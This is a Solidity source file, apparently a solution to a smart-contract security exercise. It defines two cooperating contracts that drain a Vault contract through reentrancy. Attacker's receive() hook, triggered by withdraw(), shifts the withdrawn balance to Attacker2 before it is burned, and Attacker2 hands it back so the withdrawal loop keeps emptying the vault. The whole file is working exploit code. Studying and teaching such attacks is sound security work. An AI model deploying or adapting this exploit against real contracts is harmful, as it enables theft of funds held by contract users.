// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "./Vault.sol";

contract Attacker {
    Vault victim;
    uint256 amount = 1 ether;

    Attacker2 public attacker2;

    constructor(Vault _victim) payable {
        victim = Vault(_victim);
    }

    function setattacker2(address _attacker2) public {
        attacker2 = Attacker2(_attacker2);
    }

    function attack() public payable {
        uint256 value = address(this).balance;
        victim.deposit{value: value}();
        while (address(victim).balance >= amount) {
            victim.withdraw();
            attacker2.send(value, address(this));
        }
    }

    /**
     * @notice Receive ether. the same amount of withdraw() but we can transfer the same amount to attacker2.
     * Because burn balance of attacker1 after this function.
     * @dev triggered by victim.withdraw()
     */
    receive() external payable {
        victim.transfer(address(attacker2), msg.value);
    }
}

contract Attacker2 {
    uint256 amount = 1 ether;
    Vault victim;

    constructor(Vault _victim) {
        victim = Vault(_victim);
    }

    function send(uint256 value, address attacker) public {
        victim.transfer(attacker, value);
    }
}
